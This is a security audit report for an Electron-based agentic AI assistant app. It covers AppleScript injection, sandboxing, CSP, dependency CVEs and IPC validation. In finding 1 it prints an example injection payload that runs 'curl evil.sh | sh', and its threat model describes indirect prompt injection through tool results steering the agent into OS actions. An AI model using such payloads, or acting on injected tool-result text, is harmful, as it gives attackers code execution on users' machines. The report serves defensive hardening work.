# OpenUI — Security Audit & Remediation Report

**Scope:** Pre-public-release security assessment of the OpenUI Electron app
(menu-bar AI assistant; Electron + Vite + React + TypeScript).
**Assessor role:** Lead Application Security Engineer.
**Outcome:** All findings below were remediated and the build was re-validated
(`tsc --noEmit` ✓, `electron-vite build` ✓).

---

## Threat model (why these matter)

OpenUI runs an **agentic loop**: an LLM emits tool calls that drive the host OS
(launch apps, search the filesystem, edit Calendar, move/click the mouse, type
keystrokes, capture the screen). The model's output is therefore an
**untrusted, attacker-influenceable input** — it can be steered by *indirect
prompt injection* via tool results (e.g. a malicious filename returned by
`search_files`, or text on screen read by `read_screen`). Any path from "model
output" to "shell/AppleScript/OS action" must be treated as a trust boundary.

---

## Findings summary

| # | Severity | Area | Finding | Status |
|---|----------|------|---------|--------|
| 1 | **Critical** | Tool execution | AppleScript injection → arbitrary command execution (RCE) in `open_app` & `control_calendar` | ✅ Fixed |
| 2 | High | Electron | `sandbox: false` on the BrowserWindow | ✅ Fixed |
| 3 | High | Electron | No Content-Security-Policy on the renderer | ✅ Fixed |
| 4 | High | Electron | No navigation / popup / webview guards | ✅ Fixed |
| 5 | High | Dependencies | Electron 33 — 18 high-severity CVEs; node-tar (electron-builder) high CVEs | ✅ Fixed |
| 6 | Medium | IPC | IPC handlers (`openui:chat`, `openui:voice`, `open-settings`) trusted renderer input without validation | ✅ Fixed |
| 7 | Medium | Tool execution | No JSON-schema validation of LLM tool arguments (e.g. nested object where a string is expected) | ✅ Fixed |
| 8 | Medium | Tool execution | `search_files` executed through a shell (`exec` + `\| head`) | ✅ Fixed |
| 9 | Medium | Secrets / repo hygiene | `.gitignore` did not exclude `.env`/keys/certs; no `.env.example` | ✅ Fixed |
| 10 | Low (dev-only) | Dependencies | vite/esbuild dev-server CVEs | ✅ Fixed (vite 7) |
| 11 | Low (accepted) | Dependencies | `jimp`/`file-type` (via nut.js) DoS — **no upstream fix** | ⚠️ Documented |
| 12 | Info | Secrets | No hardcoded API keys found anywhere in the source | ✅ Verified clean |

---

## Detailed findings

### 1. CRITICAL — AppleScript injection → RCE (`src/main/tools.ts`)

**Root cause.** Tools ran AppleScript through `node-osascript`'s variable
injection. That library serialises string variables with **no escaping**
(`node_modules/node-osascript/lib/osa-vargen.js`):

```js
} else if (typeOf === 'string') {
    result = '"' + value + '"';   // ← no escaping of " or \
}
```

It then prepends `set <name> to "<value>"` to the script. Any `"` in a tool
argument closes the literal and the remainder is executed as AppleScript.

**Exploit.** The agent's `open_app` did:

```js
await runAppleScript('tell application appName to activate', { appName })
```

A model call (steerable via prompt injection) of
`open_app({ appName: 'x" \n do shell script "curl evil.sh | sh" \n --' })`
produces an AppleScript that runs `do shell script "…"` → **arbitrary shell
command execution as the user**. `control_calendar` was identical: `title`,
`calendar`, `start`, `end`, `notes` were all injected unescaped, and
`start`/`end` were even used in a bare `date theStart` context.

**Fix.**
- Removed all use of node-osascript's variable injection. Scripts are now built
  with every dynamic value passed through a proper AppleScript string-literal
  escaper (`asStringLiteral`, escapes `\` and `"`).
- `open_app` additionally rejects non-string input and validates the name
  against a strict allowlist (`/^[A-Za-z0-9 ._+()&'-]{1,128}$/`).
- `control_calendar` accepts only string detail fields (a nested object/array is
  rejected, not coerced to `"[object Object]"`).

### 2. HIGH — Renderer not sandboxed (`src/main/index.ts`)

`webPreferences.sandbox` was `false`. Changed to `sandbox: true` (and set
`webSecurity: true`, `nodeIntegrationInWorker: false` explicitly). The preload
uses only `contextBridge` + `ipcRenderer`, both available in a sandboxed
renderer, so the change is behaviour-preserving. `contextIsolation: true` and
`nodeIntegration: false` were already correct.

### 3. HIGH — No Content-Security-Policy

The renderer had no CSP, so injected markup could load remote scripts. Added a
CSP applied to **every** renderer response via
`session.defaultSession.webRequest.onHeadersReceived`. Production policy is
strict (`default-src 'self'`, `script-src 'self'`, `object-src 'none'`,
`frame-src 'none'`, `base-uri 'none'`, `form-action 'none'`). Because the
renderer makes **no** direct network calls (every API call is proxied through
the main process), nothing legitimate is broken. Dev mode relaxes the policy for
the Vite dev server / HMR / React Fast Refresh only.

### 4. HIGH — No navigation / popup / webview guards

Added a global `web-contents-created` handler that:
- denies all `window.open` (`setWindowOpenHandler → { action: 'deny' }`),
  routing genuine `https://` links to the system browser via `shell.openExternal`;
- blocks `will-navigate` to anything except the app origin (dev URL / `file://`);
- blocks `will-attach-webview`.

This contains a compromised renderer even if XSS were achieved.

### 5. HIGH — Vulnerable dependencies (runtime + release pipeline)

- **Electron 33.4.11** carried 18 high-severity advisories (ASAR integrity
  bypass, multiple use-after-frees, IPC spoofing, header injection, etc.).
  Upgraded to **electron ^42.4.1**.
- **node-tar** (transitive via electron-builder/@electron/rebuild) had high
  path-traversal / arbitrary-write CVEs affecting the packaging step. Upgraded
  **electron-builder ^25 → ^26.15.3**.

`npm audit` went from **20 vulnerabilities (11 high)** to **8 (0 high, 7
moderate, 1 low)**. Build re-validated against the new toolchain.

### 6. MEDIUM — Unvalidated IPC input

`ipcMain.handle('openui:chat')`, `('openui:voice')` and
`ipcMain.on('openui:permission:open-settings')` trusted the renderer payload.
Added validation:
- **chat**: `message` must be a non-empty string ≤ 16 000 chars; `tier` is
  coerced to a known value (`coerceTier`, defaults to `free`).
- **voice**: audio must be a non-empty byte view ≤ 25 MB (Whisper's limit);
  `mimeType` is matched against an audio MIME allowlist; `tier` coerced.
- **open-settings**: `permission` is checked against a fixed allowlist before it
  is used to resolve a `shell.openExternal` deep-link.

### 7. MEDIUM — No schema validation of LLM tool arguments

Added `validateArgs()` in `executeTool`: arguments must be a plain object;
required keys must be present; each field must match its declared JSON type
(`string`/`number`/`object`) and `enum` membership. This is the enforced trust
boundary between model output and OS actions — e.g. `open_app` now rejects a
nested object for `appName` instead of stringifying it.

### 8. MEDIUM — `search_files` used a shell

Replaced `exec(\`mdfind ${shellQuote(query)} | head -n 20\`)` with
`execFile('mdfind', [query])` (no shell spawned; the query is a single argv
element and shell metacharacters are inert). Results are capped in JS. The
length is bounded (≤ 512 chars).

### 9. MEDIUM — Repo hygiene / secrets

- Rewrote `.gitignore` to exclude `.env` and `.env.*` (keeping `.env.example`),
  plus private keys and signing material (`*.pem`, `*.key`, `*.p12`, `*.pfx`,
  `*.cer`, `*.crt`, `*.keystore`, `*.jks`, `*.mobileprovision`,
  `*.provisionprofile`, `secrets.json`, `credentials.json`), build output and OS
  cruft.
- Added `.env.example` documenting every variable the **main process** reads,
  with dummy values.

### 10. LOW (dev-only) — vite/esbuild dev-server CVEs

Upgraded **vite ^5 → ^7.3.5** and **electron-vite ^2 → ^5**, clearing the vite
path-traversal / Windows NTLM-disclosure (high) and esbuild dev-server
(moderate) advisories. These affect only the local dev server, never the
packaged app.

### 11. LOW (accepted risk) — `jimp` / `file-type` via nut.js

`@nut-tree-fork/nut-js` depends on `jimp` → `file-type`, which has a moderate
DoS (infinite loop) when parsing **malformed ASF image files**. **No upstream
fix is available.** OpenUI never feeds untrusted image files to nut.js/jimp (it
only processes screenshots it captures itself), so the vulnerable code path is
not reachable in normal use. Tracked for a future nut.js update.

### 12. INFO — No hardcoded secrets

A full-tree scan (`sk-…`, `sk-ant-…`, `api[-_]?key`, `Bearer`, `AKIA`, etc.)
found **no** hardcoded credentials. All keys are read from `process.env` in the
main process only and are never exposed to the renderer — a good baseline that
the changes above preserve.

---

## Residual risk & recommendations

- **Indirect prompt injection remains the top design risk.** Validation now
  prevents argument-level escapes, but the model can still be socially
  engineered into legitimate-but-unwanted actions (e.g. "open Mail and type …").
  Recommend a user-confirmation step for state-changing tools
  (`open_app`, `control_calendar` create, `type_text`, `left_click`) before GA.
- **`read_screen` (pro/enterprise) uploads a full-screen screenshot to
  Anthropic.** This is by design but is a privacy consideration worth surfacing
  in the UI/consent flow.
- Re-run `npm audit` periodically and adopt a patched `nut.js`/`jimp` when
  released to clear finding #11.
- Consider adding `electron-builder` code-signing + notarization config and ASAR
  integrity for the macOS release.
